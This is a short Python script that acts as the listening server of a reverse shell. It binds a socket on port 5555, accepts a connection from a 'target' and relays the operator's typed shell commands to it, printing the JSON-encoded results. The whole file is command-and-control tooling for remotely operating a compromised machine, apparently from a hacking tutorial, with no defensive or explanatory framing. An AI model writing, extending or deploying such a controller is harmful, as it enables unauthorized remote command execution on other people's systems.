import socket
import termcolor
import json


def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().strip()
            return json.loads(data)
        except ValueError:
            continue


def reliable_send(data):
    json_data = json.dumps(data)
    target.send(json_data.encode())


def target_communication():
    while True:
        command = input('* Shell~%s: ' % str(ip))
        reliable_send(command)
        if command == 'quit':
            break

        result = reliable_recv()
        print(result)


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('127.0.0.1', 5555))
print(termcolor.colored('[+] Listening for the incoming connection...', 'green'))
sock.listen(5)

target, ip = sock.accept()
print(termcolor.colored('[+] Target connected from: ' + str(ip), 'green'))

target_communication()
